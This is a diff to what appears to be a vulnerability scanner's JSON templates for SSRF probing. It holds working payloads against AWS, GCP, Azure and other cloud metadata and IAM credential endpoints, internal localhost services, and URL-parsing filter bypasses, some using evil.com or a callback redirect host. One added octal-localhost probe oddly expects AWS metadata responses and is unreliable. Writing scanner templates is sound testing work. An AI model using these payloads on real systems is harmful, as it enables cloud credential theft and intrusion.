@@ -28,7 +28,7 @@
       "probes": [
         {
           "payload": "http://169.254.169.254/latest/meta-data/",
-          "description": "AWS IMDSv1 metadata endpoint \u2014 ami-id or instance-id confirms SSRF to AWS metadata",
+          "description": "AWS IMDSv1 metadata endpoint — ami-id or instance-id confirms SSRF to AWS metadata",
           "matchers": [
             {
               "type": "word",
@@ -46,7 +46,7 @@
         },
         {
           "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-          "description": "AWS IAM credentials endpoint \u2014 role name in response reveals attached IAM role. Follow-up GET reveals AccessKeyId / SecretAccessKey / Token.",
+          "description": "AWS IAM credentials endpoint — role name in response reveals attached IAM role. Follow-up GET reveals AccessKeyId / SecretAccessKey / Token.",
           "matchers": [
             {
               "type": "word",
@@ -66,7 +66,7 @@
         },
         {
           "payload": "http://metadata.google.internal/computeMetadata/v1/",
-          "description": "GCP metadata endpoint \u2014 requires Metadata-Flavor header bypass",
+          "description": "GCP metadata endpoint — requires Metadata-Flavor header bypass",
           "matchers": [
             {
               "type": "word",
@@ -83,7 +83,7 @@
         },
         {
           "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-          "description": "Azure IMDS endpoint \u2014 compute details confirm Azure SSRF",
+          "description": "Azure IMDS endpoint — compute details confirm Azure SSRF",
           "matchers": [
             {
               "type": "word",
@@ -101,7 +101,7 @@
         },
         {
           "payload": "http://169.254.169.254/metadata/v1.json",
-          "description": "DigitalOcean metadata endpoint \u2014 droplet_id or region in response confirms SSRF to DO metadata",
+          "description": "DigitalOcean metadata endpoint — droplet_id or region in response confirms SSRF to DO metadata",
           "matchers": [
             {
               "type": "word",
@@ -120,7 +120,7 @@
         },
         {
           "payload": "http://169.254.169.254/opc/v1/instance/",
-          "description": "Oracle Cloud IMDS endpoint \u2014 compartmentId or shape in response confirms SSRF to OCI metadata",
+          "description": "Oracle Cloud IMDS endpoint — compartmentId or shape in response confirms SSRF to OCI metadata",
           "matchers": [
             {
               "type": "word",
@@ -139,7 +139,7 @@
         },
         {
           "payload": "http://100.100.100.200/latest/meta-data/",
-          "description": "Alibaba Cloud ECS metadata endpoint \u2014 instance-id or region-id confirms SSRF to Alibaba Cloud metadata",
+          "description": "Alibaba Cloud ECS metadata endpoint — instance-id or region-id confirms SSRF to Alibaba Cloud metadata",
           "matchers": [
             {
               "type": "word",
@@ -180,7 +180,7 @@
       "probes": [
         {
           "payload": "http://127.0.0.1/",
-          "description": "SSRF to localhost root \u2014 length diff indicates internal content served",
+          "description": "SSRF to localhost root — length diff indicates internal content served",
           "matchers": [
             {
               "type": "length_diff",
@@ -193,7 +193,7 @@
         },
         {
           "payload": "http://127.0.0.1:22/",
-          "description": "SSRF to localhost SSH port \u2014 SSH banner in response confirms internal reach",
+          "description": "SSRF to localhost SSH port — SSH banner in response confirms internal reach",
           "matchers": [
             {
               "type": "word",
@@ -211,7 +211,7 @@
         },
         {
           "payload": "http://127.0.0.1:6379/",
-          "description": "SSRF to localhost Redis \u2014 Redis error banner confirms internal reach",
+          "description": "SSRF to localhost Redis — Redis error banner confirms internal reach",
           "matchers": [
             {
               "type": "word",
@@ -256,7 +256,7 @@
       ]
     },
     "url_bypass": {
-      "description": "SSRF filter bypass via URL parsing ambiguities \u2014 at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
+      "description": "SSRF filter bypass via URL parsing ambiguities — at-sign, fragment, shortened IP, zero IP, backslash tricks from HackTricks",
       "tech_match": [],
       "param_match": [
         "url",
@@ -277,7 +277,7 @@
       "probes": [
         {
           "payload": "http://127.0.0.1@evil.com/",
-          "description": "At-sign URL parsing trick \u2014 some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
+          "description": "At-sign URL parsing trick — some parsers use evil.com as host while fetchers use 127.0.0.1 as auth host",
           "matchers": [
             {
               "type": "length_diff",
@@ -290,7 +290,7 @@
         },
         {
           "payload": "http://evil.com#@127.0.0.1/",
-          "description": "Fragment bypass \u2014 some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
+          "description": "Fragment bypass — some validators stop at # treating 127.0.0.1 as fragment, fetcher uses it as host",
           "matchers": [
             {
               "type": "length_diff",
@@ -303,7 +303,7 @@
         },
         {
           "payload": "http://127.1/",
-          "description": "Shortened localhost IP \u2014 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
+          "description": "Shortened localhost IP — 127.1 resolves to 127.0.0.1 on most systems, bypasses full-quad filters",
           "matchers": [
             {
               "type": "length_diff",
@@ -316,7 +316,7 @@
         },
         {
           "payload": "http://0/",
-          "description": "Zero IP \u2014 resolves to 0.0.0.0 which maps to localhost on many systems",
+          "description": "Zero IP — resolves to 0.0.0.0 which maps to localhost on many systems",
           "matchers": [
             {
               "type": "length_diff",
@@ -329,7 +329,7 @@
         },
         {
           "payload": "http://127.0.0.1:80\\@evil.com/",
-          "description": "Backslash before @ trick \u2014 some URL parsers treat backslash as path separator, others as authority delimiter",
+          "description": "Backslash before @ trick — some URL parsers treat backslash as path separator, others as authority delimiter",
           "matchers": [
             {
               "type": "length_diff",
@@ -343,7 +343,7 @@
       ]
     },
     "redirect_based": {
-      "description": "SSRF via open redirect chains \u2014 server fetches a URL that redirects to an internal resource",
+      "description": "SSRF via open redirect chains — server fetches a URL that redirects to an internal resource",
       "tech_match": [],
       "param_match": [
         "url",
@@ -364,7 +364,7 @@
       "probes": [
         {
           "payload": "https://{{callback}}/redirect?url=http://169.254.169.254/",
-          "description": "SSRF via open redirect \u2014 server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
+          "description": "SSRF via open redirect — server-side fetch follows redirect to cloud metadata endpoint; check collaborator for interaction",
           "matchers": [
             {
               "type": "length_diff",
@@ -377,7 +377,7 @@
         },
         {
           "payload": "http://169.254.169.254/latest/meta-data/hostname",
-          "description": "AWS EC2 hostname metadata \u2014 short string response is high-confidence SSRF confirmation",
+          "description": "AWS EC2 hostname metadata — short string response is high-confidence SSRF confirmation",
           "matchers": [
             {
               "type": "regex",
@@ -386,6 +386,117 @@
           ],
           "severity": "critical",
           "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "proxy_verb_unsafe": {
+      "description": "SSRF via raw HTTP CONNECT / verb on absolute URL. Forward proxy mode exposes internal services.",
+      "tech_match": [
+        "nginx",
+        "haproxy",
+        "envoy"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Raw GET http://127.0.0.1:22 HTTP/1.1 — proxy-mode SSRF returns SSH banner",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "SSH",
+                "OpenSSH",
+                "Protocol mismatch"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                502
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "raw_url": "http://127.0.0.1:22/",
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "cloud_metadata_2025_bypass": {
+      "description": "2025 bypass primitives for cloud metadata SSRF. nip.io, IPv4-mapped IPv6, octal, IMDSv2 force-header.",
+      "tech_match": [
+        "AWS",
+        "GCP",
+        "Azure"
+      ],
+      "param_match": [
+        "url",
+        "uri",
+        "callback",
+        "redirect",
+        "feed",
+        "dest"
+      ],
+      "probes": [
+        {
+          "payload": "http://169.254.169.254.nip.io/latest/meta-data/",
+          "description": "DNS-resolver bypass — nip.io reflects 169.254.169.254 in A record",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+          "description": "IPv4-mapped IPv6 bypass — same metadata endpoint via mapped IPv6 literal",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "http://0177.0.0.1/latest/meta-data/",
+          "description": "Octal IP encoding bypass — 0177 = 127 in octal",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "ami-id",
+                "instance-id",
+                "iam"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
           "variables": {}
         }
       ]
